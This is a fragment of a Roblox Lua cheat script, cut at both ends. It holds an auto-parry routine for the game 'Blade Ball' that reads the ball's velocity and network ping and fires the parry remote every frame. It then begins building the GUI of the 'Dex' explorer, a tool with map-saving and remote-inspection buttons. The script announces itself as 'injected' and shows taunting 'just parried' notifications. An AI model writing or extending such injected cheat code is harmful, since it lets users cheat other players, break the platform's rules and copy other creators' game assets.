⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠒⠐⠒⠂⠂⠂⠑⠀⠃⠈⠀⠃⠈⠀⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

						
]]

		print(furry)
	end)
	for i = 1, 10 do
		print("minor has injected into blade ball")
	end
	function FindBall()
		local RealBall

		for i, v in pairs(Balls:GetChildren()) do
			if v:GetAttribute("realBall") == true then
				RealBall = v
			end
		end
		return RealBall
	end

	function IsTarget()
		local Ball = FindBall()


		if Ball and Ball:GetAttribute("target") == LocalPlayer.Name then
			return true
		end
		return false
	end

	function DetectBall()
		local Ball = FindBall()

		if Ball then
			local BallVelocity = Ball.Velocity.Magnitude
			local BallPosition = Ball.Position

			local PlayerPosition = LocalPlayer.Character.HumanoidRootPart.Position

			local Distance = (BallPosition - PlayerPosition).Magnitude
			local PingAccountability = BallVelocity * (game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000)

			Distance -= PingAccountability
			Distance -= shared.config.adjustment

			local Hit = Distance / BallVelocity

			if Hit <= shared.config.hit_range then
				return true
			end
		end
		return false
	end

	function DeflectBall()
		if IsTargeted and DetectBall() then
			if shared.config.deflect_type == 'Key Press' then
				ReplicatedStorage.Remotes.ParryButtonPress:Fire()
			else
				ReplicatedStorage.Remotes.ParryButtonPress:Fire()
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "Blade Ball",
					Text = 'HAH JUST PARRIED',
				})
			end
		end
	end

	UserInputService.InputBegan:Connect(function(Input, IsTyping)
		if IsTyping then return end
		if shared.config.mode == 'Toggle' and Input.KeyCode == shared.config.keybind then
			CanHit = not CanHit
			if shared.config.notifications then
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "Blade Ball",
					Text = CanHit and 'Enabled!' or 'Disabled!',
				})
			end
		elseif shared.config.mode == 'Hold' and Input.KeyCode == shared.config.keybind and shared.config.notifications then
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "Blade Ball",
				Text = 'Holding keybind!',
			})
		end
	end)

	UserInputService.InputEnded:Connect(function(Input, IsTyping)
		if IsTyping then return end
		if shared.config.mode == 'Hold' and Input.KeyCode == shared.config.keybind and shared.config.notifications then
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "Blade Ball",
				Text = 'No longer holding keybind!',
			})
		end
	end)

	game:GetService('RunService').RenderStepped:Connect(function()
		DeflectBall()
	end)

end

function mod:LoadDex()
	CreateGui = function()
		local NewGuiPart1 = Instance.new("ScreenGui")
		local NewGuiPart2 = Instance.new("Frame")
		local NewGuiPart3 = Instance.new("Frame")
		local NewGuiPart4 = Instance.new("TextLabel")
		local NewGuiPart5 = Instance.new("TextBox")
		local NewGuiPart6 = Instance.new("Frame")
		local NewGuiPart7 = Instance.new("Frame")
		local NewGuiPart8 = Instance.new("TextButton")
		local NewGuiPart9 = Instance.new("TextLabel")
		local NewGuiPart10 = Instance.new("TextLabel")
		local NewGuiPart11 = Instance.new("ImageLabel")
		local NewGuiPart12 = Instance.new("Frame")
		local NewGuiPart13 = Instance.new("Frame")
		local NewGuiPart14 = Instance.new("Frame")
		local NewGuiPart15 = Instance.new("TextButton")
		local NewGuiPart16 = Instance.new("ImageLabel")
		local NewGuiPart17 = Instance.new("TextButton")
		local NewGuiPart18 = Instance.new("ImageLabel")
		local NewGuiPart19 = Instance.new("TextButton")
		local NewGuiPart20 = Instance.new("ImageLabel")
		local NewGuiPart21 = Instance.new("TextButton")
		local NewGuiPart22 = Instance.new("ImageLabel")
		local NewGuiPart23 = Instance.new("TextButton")
		local NewGuiPart24 = Instance.new("ImageLabel")
		local NewGuiPart25 = Instance.new("TextButton")
		local NewGuiPart26 = Instance.new("ImageLabel")
		local NewGuiPart27 = Instance.new("TextButton")
		local NewGuiPart28 = Instance.new("Frame")
		local NewGuiPart29 = Instance.new("Frame")
		local NewGuiPart30 = Instance.new("TextLabel")
		local NewGuiPart31 = Instance.new("Frame")
		local NewGuiPart32 = Instance.new("TextLabel")
		local NewGuiPart33 = Instance.new("TextLabel")
		local NewGuiPart34 = Instance.new("TextButton")
		local NewGuiPart35 = Instance.new("TextLabel")
		local NewGuiPart36 = Instance.new("TextLabel")
		local NewGuiPart37 = Instance.new("Frame")
		local NewGuiPart38 = Instance.new("Frame")
		local NewGuiPart39 = Instance.new("TextLabel")
		local NewGuiPart40 = Instance.new("Frame")
		local NewGuiPart41 = Instance.new("TextButton")
		local NewGuiPart42 = Instance.new("TextLabel")
		local NewGuiPart43 = Instance.new("TextButton")
		local NewGuiPart44 = Instance.new("TextBox")
		local NewGuiPart45 = Instance.new("TextButton")
		local NewGuiPart46 = Instance.new("TextLabel")
		local NewGuiPart47 = Instance.new("TextLabel")
		local NewGuiPart48 = Instance.new("Frame")
		local NewGuiPart49 = Instance.new("TextLabel")
		local NewGuiPart50 = Instance.new("Frame")
		local NewGuiPart51 = Instance.new("TextButton")
		local NewGuiPart52 = Instance.new("TextLabel")
		local NewGuiPart53 = Instance.new("TextButton")
		local NewGuiPart54 = Instance.new("Frame")
		local NewGuiPart55 = Instance.new("TextLabel")
		local NewGuiPart56 = Instance.new("Frame")
		local NewGuiPart57 = Instance.new("TextLabel")
		local NewGuiPart58 = Instance.new("TextButton")
		local NewGuiPart59 = Instance.new("Frame")
		local NewGuiPart60 = Instance.new("TextLabel")
		local NewGuiPart61 = Instance.new("Frame")
		local NewGuiPart62 = Instance.new("TextLabel")
		local NewGuiPart63 = Instance.new("ScrollingFrame")
		local NewGuiPart64 = Instance.new("TextButton")
		local NewGuiPart65 = Instance.new("TextLabel")
		local NewGuiPart66 = Instance.new("TextLabel")
		local NewGuiPart67 = Instance.new("TextButton")
		local NewGuiPart68 = Instance.new("TextButton")
		local NewGuiPart69 = Instance.new("Frame")
		local NewGuiPart70 = Instance.new("TextButton")
		local NewGuiPart71 = Instance.new("TextBox")
		local NewGuiPart72 = Instance.new("TextButton")
		local NewGuiPart73 = Instance.new("TextButton")
		local NewGuiPart74 = Instance.new("Frame")
		local NewGuiPart75 = Instance.new("Frame")
		local NewGuiPart76 = Instance.new("TextButton")
		local NewGuiPart77 = Instance.new("ScrollingFrame")
		local NewGuiPart78 = Instance.new("Frame")
		local NewGuiPart79 = Instance.new("TextLabel")
		local NewGuiPart80 = Instance.new("TextLabel")
		local NewGuiPart81 = Instance.new("TextLabel")
		local NewGuiPart82 = Instance.new("Frame")
		local NewGuiPart83 = Instance.new("TextLabel")
		local NewGuiPart84 = Instance.new("Frame")
		local NewGuiPart85 = Instance.new("Frame")
		local NewGuiPart86 = Instance.new("Frame")
		local NewGuiPart87 = Instance.new("ImageButton")
		local NewGuiPart88 = Instance.new("Frame")
		local NewGuiPart89 = Instance.new("Frame")
		local NewGuiPart90 = Instance.new("Frame")
		local NewGuiPart91 = Instance.new("Frame")
		local NewGuiPart92 = Instance.new("Frame")
		local NewGuiPart93 = Instance.new("ImageButton")
		local NewGuiPart94 = Instance.new("Frame")
		local NewGuiPart95 = Instance.new("Frame")
		local NewGuiPart96 = Instance.new("Frame")
		local NewGuiPart97 = Instance.new("Frame")
		local NewGuiPart98 = Instance.new("Frame")
		local NewGuiPart99 = Instance.new("TextButton")
		local NewGuiPart100 = Instance.new("Frame")
		local NewGuiPart101 = Instance.new("Frame")
		local NewGuiPart102 = Instance.new("TextButton")
		local NewGuiPart103 = Instance.new("TextButton")
		local NewGuiPart104 = Instance.new("TextButton")
		local NewGuiPart105 = Instance.new("Frame")
		local NewGuiPart106 = Instance.new("Frame")
		local NewGuiPart107 = Instance.new("TextLabel")
		local NewGuiPart108 = Instance.new("TextLabel")
		local NewGuiPart109 = Instance.new("TextLabel")
		local NewGuiPart110 = Instance.new("ImageLabel")
		local NewGuiPart111 = Instance.new("Frame")
		local NewGuiPart112 = Instance.new("Frame")
		local NewGuiPart113 = Instance.new("TextLabel")
		local NewGuiPart114 = Instance.new("Frame")
		local NewGuiPart115 = Instance.new("Frame")
		local NewGuiPart116 = Instance.new("TextLabel")
		local NewGuiPart117 = Instance.new("TextLabel")
		local NewGuiPart118 = Instance.new("TextButton")
		local NewGuiPart119 = Instance.new("TextLabel")
		local NewGuiPart120 = Instance.new("TextLabel")
		local NewGuiPart121 = Instance.new("Frame")
		local NewGuiPart122 = Instance.new("TextLabel")
		local NewGuiPart123 = Instance.new("TextLabel")
		local NewGuiPart124 = Instance.new("TextButton")
		local NewGuiPart125 = Instance.new("TextLabel")
		local NewGuiPart126 = Instance.new("TextLabel")
		local NewGuiPart127 = Instance.new("Frame")
		local NewGuiPart128 = Instance.new("TextLabel")
		local NewGuiPart129 = Instance.new("TextLabel")
		local NewGuiPart130 = Instance.new("TextButton")
		local NewGuiPart131 = Instance.new("TextLabel")
		local NewGuiPart132 = Instance.new("TextLabel")
		local NewGuiPart133 = Instance.new("Frame")
		local NewGuiPart134 = Instance.new("TextLabel")
		local NewGuiPart135 = Instance.new("TextLabel")
		local NewGuiPart136 = Instance.new("TextButton")
		local NewGuiPart137 = Instance.new("TextLabel")
		local NewGuiPart138 = Instance.new("TextLabel")
		local NewGuiPart139 = Instance.new("TextLabel")
		local NewGuiPart140 = Instance.new("Frame")
		local NewGuiPart141 = Instance.new("Frame")
		local NewGuiPart142 = Instance.new("TextLabel")
		local NewGuiPart143 = Instance.new("TextButton")
		local NewGuiPart144 = Instance.new("TextBox")
		local NewGuiPart145 = Instance.new("Frame")
		local NewGuiPart146 = Instance.new("TextButton")
		local NewGuiPart147 = Instance.new("TextLabel")
		local NewGuiPart148 = Instance.new("TextLabel")
		local NewGuiPart149 = Instance.new("Frame")
		local NewGuiPart150 = Instance.new("Frame")
		local NewGuiPart151 = Instance.new("TextLabel")
		local NewGuiPart152 = Instance.new("TextLabel")
		local NewGuiPart153 = Instance.new("BindableFunction")
		local NewGuiPart154 = Instance.new("BindableFunction")
		local NewGuiPart155 = Instance.new("BindableFunction")
		local NewGuiPart156 = Instance.new("BindableFunction")
		local NewGuiPart157 = Instance.new("BindableEvent")
		local NewGuiPart158 = Instance.new("BindableFunction")
		local NewGuiPart159 = Instance.new("BindableFunction")
		local NewGuiPart160 = Instance.new("BindableEvent")
		local NewGuiPart161 = Instance.new("BindableFunction")
		local NewGuiPart162 = Instance.new("BindableFunction")
		local NewGuiPart163 = Instance.new("BindableEvent")
		-- Properties

		NewGuiPart1.Name = "Dex"

		NewGuiPart2.Name = "PropertiesFrame"
		NewGuiPart2.Parent = NewGuiPart1
		NewGuiPart2.Active = true
		NewGuiPart2.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart2.BackgroundTransparency = 0.10000000149012
		NewGuiPart2.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart2.Position = UDim2.new(1, 0, 0.5, 36)
		NewGuiPart2.Size = UDim2.new(0, 300, 0.5, -36)

		NewGuiPart158.Name = "GetApi"
		NewGuiPart158.Parent = NewGuiPart2
		NewGuiPart158.Archivable = true

		NewGuiPart159.Name = "GetAwaiting"
		NewGuiPart159.Parent = NewGuiPart2
		NewGuiPart159.Archivable = true

		NewGuiPart160.Name = "SetAwaiting"
		NewGuiPart160.Parent = NewGuiPart2
		NewGuiPart160.Archivable = true

		NewGuiPart3.Name = "Header"
		NewGuiPart3.Parent = NewGuiPart2
		NewGuiPart3.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart3.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart3.Position = UDim2.new(0, 0, 0, -36)
		NewGuiPart3.Size = UDim2.new(1, 0, 0, 35)

		NewGuiPart4.Parent = NewGuiPart3
		NewGuiPart4.BackgroundTransparency = 1
		NewGuiPart4.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart4.Size = UDim2.new(1, -4, 0.5, 0)
		NewGuiPart4.Font = Enum.Font.SourceSans
		NewGuiPart4.FontSize = Enum.FontSize.Size14
		NewGuiPart4.Text = "Properties"
		NewGuiPart4.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart4.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart5.Parent = NewGuiPart3
		NewGuiPart5.BackgroundTransparency = 0.80000001192093
		NewGuiPart5.Position = UDim2.new(0, 4, 0.5, 0)
		NewGuiPart5.Size = UDim2.new(1, -8, 0.5, -3)
		NewGuiPart5.Font = Enum.Font.SourceSans
		NewGuiPart5.FontSize = Enum.FontSize.Size14
		NewGuiPart5.Text = "Search Properties"
		--NewGuiPart5.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart5.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart6.Name = "ExplorerPanel"
		NewGuiPart6.Parent = NewGuiPart1
		NewGuiPart6.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart6.BackgroundTransparency = 0.10000000149012
		NewGuiPart6.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart6.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart6.Size = UDim2.new(0, 300, 0.5, 0)

		NewGuiPart153.Name = "GetOption"
		NewGuiPart153.Parent = NewGuiPart6
		NewGuiPart153.Archivable = true

		NewGuiPart154.Name = "GetSelection"
		NewGuiPart154.Parent = NewGuiPart6
		NewGuiPart154.Archivable = true

		NewGuiPart155.Name = "SetOption"
		NewGuiPart155.Parent = NewGuiPart6
		NewGuiPart155.Archivable = true

		NewGuiPart156.Name = "SetSelection"
		NewGuiPart156.Parent = NewGuiPart6
		NewGuiPart156.Archivable = true

		NewGuiPart157.Name = "SelectionChanged"
		NewGuiPart157.Parent = NewGuiPart6
		NewGuiPart157.Archivable = true

		NewGuiPart7.Name = "SideMenu"
		NewGuiPart7.Parent = NewGuiPart1
		NewGuiPart7.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart7.BackgroundTransparency = 1
		NewGuiPart7.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart7.BorderSizePixel = 0
		NewGuiPart7.Position = UDim2.new(1, -330, 0, 0)
		NewGuiPart7.Size = UDim2.new(0, 30, 0, 180)
		NewGuiPart7.Visible = false
		NewGuiPart7.ZIndex = 2

		NewGuiPart8.Name = "Toggle"
		NewGuiPart8.Parent = NewGuiPart7
		NewGuiPart8.Active = false
		NewGuiPart8.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart8.BorderSizePixel = 0
		NewGuiPart8.Position = UDim2.new(0, 0, 0, 60)
		NewGuiPart8.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart8.AutoButtonColor = false
		NewGuiPart8.Font = Enum.Font.SourceSans
		NewGuiPart8.FontSize = Enum.FontSize.Size24
		NewGuiPart8.Text = ">"
		NewGuiPart8.TextTransparency = 1
		NewGuiPart8.TextWrapped = true

		NewGuiPart9.Name = "Title"
		NewGuiPart9.Parent = NewGuiPart7
		NewGuiPart9.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart9.BackgroundTransparency = 1
		NewGuiPart9.Size = UDim2.new(0, 30, 0, 20)
		NewGuiPart9.ZIndex = 2
		NewGuiPart9.Font = Enum.Font.SourceSansBold
		NewGuiPart9.FontSize = Enum.FontSize.Size14
		NewGuiPart9.Text = "DEX"
		NewGuiPart9.TextWrapped = true

		NewGuiPart10.Name = "Version"
		NewGuiPart10.Parent = NewGuiPart7
		NewGuiPart10.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart10.BackgroundTransparency = 1
		NewGuiPart10.Position = UDim2.new(0, 0, 0, 15)
		NewGuiPart10.Size = UDim2.new(0, 30, 0, 20)
		NewGuiPart10.ZIndex = 2
		NewGuiPart10.Font = Enum.Font.SourceSansBold
		NewGuiPart10.FontSize = Enum.FontSize.Size12
		NewGuiPart10.Text = "V2.0.0"
		NewGuiPart10.TextWrapped = true

		NewGuiPart11.Name = "Slant"
		NewGuiPart11.Parent = NewGuiPart7
		NewGuiPart11.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart11.BackgroundTransparency = 1
		NewGuiPart11.Position = UDim2.new(0, 0, 0, 90)
		NewGuiPart11.Rotation = 180
		NewGuiPart11.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart11.Image = "rbxassetid://474172996"
		NewGuiPart11.ImageColor3 = Color3.new(0.913726, 0.913726, 0.913726)

		NewGuiPart12.Name = "Main"
		NewGuiPart12.Parent = NewGuiPart7
		NewGuiPart12.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart12.BorderSizePixel = 0
		NewGuiPart12.Size = UDim2.new(0, 30, 0, 30)

		NewGuiPart13.Name = "SlideOut"
		NewGuiPart13.Parent = NewGuiPart7
		NewGuiPart13.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart13.BackgroundTransparency = 1
		NewGuiPart13.BorderSizePixel = 0
		NewGuiPart13.ClipsDescendants = true
		NewGuiPart13.Position = UDim2.new(0, 0, 0, 30)
		NewGuiPart13.Size = UDim2.new(0, 30, 0, 150)

		NewGuiPart14.Name = "SlideFrame"
		NewGuiPart14.Parent = NewGuiPart13
		NewGuiPart14.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart14.BorderSizePixel = 0
		NewGuiPart14.Position = UDim2.new(0, 0, 0, -150)
		NewGuiPart14.Size = UDim2.new(0, 30, 0, 150)

		NewGuiPart15.Name = "Explorer"
		NewGuiPart15.Parent = NewGuiPart14
		NewGuiPart15.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart15.BackgroundTransparency = 1
		NewGuiPart15.BorderSizePixel = 0
		NewGuiPart15.Position = UDim2.new(0, 0, 0, 120)
		NewGuiPart15.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart15.ZIndex = 2
		NewGuiPart15.AutoButtonColor = false
		NewGuiPart15.Font = Enum.Font.SourceSans
		NewGuiPart15.FontSize = Enum.FontSize.Size24
		NewGuiPart15.Text = ""

		NewGuiPart16.Name = "Icon"
		NewGuiPart16.Parent = NewGuiPart15
		NewGuiPart16.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart16.BackgroundTransparency = 1
		NewGuiPart16.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart16.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart16.ZIndex = 2
		NewGuiPart16.Image = "rbxassetid://472635937"
		NewGuiPart16.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart17.Name = "SaveMap"
		NewGuiPart17.Parent = NewGuiPart14
		NewGuiPart17.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart17.BackgroundTransparency = 1
		NewGuiPart17.BorderSizePixel = 0
		NewGuiPart17.Position = UDim2.new(0, 0, 0, 90)
		NewGuiPart17.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart17.ZIndex = 2
		NewGuiPart17.AutoButtonColor = false
		NewGuiPart17.Font = Enum.Font.SourceSans
		NewGuiPart17.FontSize = Enum.FontSize.Size24
		NewGuiPart17.Text = ""

		NewGuiPart18.Name = "Icon"
		NewGuiPart18.Parent = NewGuiPart17
		NewGuiPart18.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart18.BackgroundTransparency = 1
		NewGuiPart18.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart18.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart18.ZIndex = 2
		NewGuiPart18.Image = "rbxassetid://472636337"
		NewGuiPart18.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart19.Name = "Settings"
		NewGuiPart19.Parent = NewGuiPart14
		NewGuiPart19.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart19.BackgroundTransparency = 1
		NewGuiPart19.BorderSizePixel = 0
		NewGuiPart19.Position = UDim2.new(0, 0, 0, 30)
		NewGuiPart19.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart19.ZIndex = 2
		NewGuiPart19.AutoButtonColor = false
		NewGuiPart19.Font = Enum.Font.SourceSans
		NewGuiPart19.FontSize = Enum.FontSize.Size24
		NewGuiPart19.Text = ""

		NewGuiPart20.Name = "Icon"
		NewGuiPart20.Parent = NewGuiPart19
		NewGuiPart20.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart20.BackgroundTransparency = 1
		NewGuiPart20.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart20.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart20.ZIndex = 2
		NewGuiPart20.Image = "rbxassetid://472635774"
		NewGuiPart20.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart21.Name = "Remotes"
		NewGuiPart21.Parent = NewGuiPart14
		NewGuiPart21.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart21.BackgroundTransparency = 1
		NewGuiPart21.BorderSizePixel = 0
		NewGuiPart21.Position = UDim2.new(0, 0, 0, 60)
		NewGuiPart21.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart21.ZIndex = 2
		NewGuiPart21.AutoButtonColor = false
		NewGuiPart21.Font = Enum.Font.SourceSans
		NewGuiPart21.FontSize = Enum.FontSize.Size24
		NewGuiPart21.Text = ""

		NewGuiPart22.Name = "Icon"
		NewGuiPart22.Parent = NewGuiPart21
		NewGuiPart22.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart22.BackgroundTransparency = 1
		NewGuiPart22.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart22.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart22.ZIndex = 2
		NewGuiPart22.Image = "rbxassetid://472636187"
		NewGuiPart22.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart23.Name = "About"
		NewGuiPart23.Parent = NewGuiPart14
		NewGuiPart23.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart23.BackgroundTransparency = 1
		NewGuiPart23.BorderSizePixel = 0
		NewGuiPart23.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart23.ZIndex = 2
		NewGuiPart23.AutoButtonColor = false
		NewGuiPart23.Font = Enum.Font.SourceSans
		NewGuiPart23.FontSize = Enum.FontSize.Size24
		NewGuiPart23.Text = ""

		NewGuiPart24.Name = "Icon"
		NewGuiPart24.Parent = NewGuiPart23
		NewGuiPart24.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart24.BackgroundTransparency = 1
		NewGuiPart24.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart24.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart24.ZIndex = 2
		NewGuiPart24.Image = "rbxassetid://476354004"
		NewGuiPart24.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart25.Name = "OpenScriptEditor"
		NewGuiPart25.Parent = NewGuiPart7
		NewGuiPart25.Active = false
		NewGuiPart25.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart25.BorderSizePixel = 0
		NewGuiPart25.Position = UDim2.new(0, 0, 0, 30)
		NewGuiPart25.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart25.ZIndex = 2
		NewGuiPart25.AutoButtonColor = false
		NewGuiPart25.Font = Enum.Font.SourceSans
		NewGuiPart25.FontSize = Enum.FontSize.Size24
		NewGuiPart25.Text = ""

		NewGuiPart26.Name = "Icon"
		NewGuiPart26.Parent = NewGuiPart25
		NewGuiPart26.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart26.BackgroundTransparency = 1
		NewGuiPart26.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart26.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart26.ZIndex = 2
		NewGuiPart26.Image = "rbxassetid://475456048"
		NewGuiPart26.ImageColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		NewGuiPart26.ImageTransparency = 1

		NewGuiPart27.Name = "Toggle"
		NewGuiPart27.Parent = NewGuiPart1
		NewGuiPart27.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart27.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart27.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart27.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart27.Font = Enum.Font.SourceSans
		NewGuiPart27.FontSize = Enum.FontSize.Size24
		NewGuiPart27.Text = "<"

		NewGuiPart28.Name = "SettingsPanel"
		NewGuiPart28.Parent = NewGuiPart1
		NewGuiPart28.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart28.BackgroundTransparency = 0.10000000149012
		NewGuiPart28.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart28.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart28.Size = UDim2.new(0, 300, 1, 0)

		NewGuiPart162.Name = "GetSetting"
		NewGuiPart162.Parent = NewGuiPart28
		NewGuiPart162.Archivable = true

		NewGuiPart29.Name = "Header"
		NewGuiPart29.Parent = NewGuiPart28
		NewGuiPart29.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart29.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart29.Size = UDim2.new(1, 0, 0, 17)

		NewGuiPart30.Parent = NewGuiPart29
		NewGuiPart30.BackgroundTransparency = 1
		NewGuiPart30.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart30.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart30.Font = Enum.Font.SourceSans
		NewGuiPart30.FontSize = Enum.FontSize.Size14
		NewGuiPart30.Text = "Settings"
		NewGuiPart30.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart30.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart31.Name = "SettingTemplate"
		NewGuiPart31.Parent = NewGuiPart28
		NewGuiPart31.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart31.BackgroundTransparency = 1
		NewGuiPart31.Position = UDim2.new(0, 0, 0, 18)
		NewGuiPart31.Size = UDim2.new(1, 0, 0, 60)
		NewGuiPart31.Visible = false

		NewGuiPart32.Name = "SName"
		NewGuiPart32.Parent = NewGuiPart31
		NewGuiPart32.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart32.BackgroundTransparency = 1
		NewGuiPart32.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart32.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart32.Font = Enum.Font.SourceSans
		NewGuiPart32.FontSize = Enum.FontSize.Size18
		NewGuiPart32.Text = "SettingName"
		NewGuiPart32.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart33.Name = "Status"
		NewGuiPart33.Parent = NewGuiPart31
		NewGuiPart33.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart33.BackgroundTransparency = 1
		NewGuiPart33.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart33.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart33.Font = Enum.Font.SourceSans
		NewGuiPart33.FontSize = Enum.FontSize.Size18
		NewGuiPart33.Text = "Off"
		NewGuiPart33.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart34.Name = "Change"
		NewGuiPart34.Parent = NewGuiPart31
		NewGuiPart34.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart34.BorderSizePixel = 0
		NewGuiPart34.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart34.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart34.Font = Enum.Font.SourceSans
		NewGuiPart34.FontSize = Enum.FontSize.Size14
		NewGuiPart34.Text = ""

		NewGuiPart35.Name = "OnBar"
		NewGuiPart35.Parent = NewGuiPart34
		NewGuiPart35.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart35.BorderSizePixel = 0
		NewGuiPart35.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart35.Font = Enum.Font.SourceSans
		NewGuiPart35.FontSize = Enum.FontSize.Size14
		NewGuiPart35.Text = ""

		NewGuiPart36.Name = "Bar"
		NewGuiPart36.Parent = NewGuiPart34
		NewGuiPart36.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart36.BorderSizePixel = 0
		NewGuiPart36.ClipsDescendants = true
		NewGuiPart36.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart36.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart36.Font = Enum.Font.SourceSans
		NewGuiPart36.FontSize = Enum.FontSize.Size14
		NewGuiPart36.Text = ""

		NewGuiPart37.Name = "SettingList"
		NewGuiPart37.Parent = NewGuiPart28
		NewGuiPart37.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart37.BackgroundTransparency = 1
		NewGuiPart37.Position = UDim2.new(0, 0, 0, 17)
		NewGuiPart37.Size = UDim2.new(1, 0, 1, -17)

		NewGuiPart38.Name = "SaveInstance"
		NewGuiPart38.Parent = NewGuiPart1
		NewGuiPart38.Active = true
		NewGuiPart38.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart38.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart38.Draggable = true
		NewGuiPart38.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart38.Size = UDim2.new(0, 350, 0, 20)
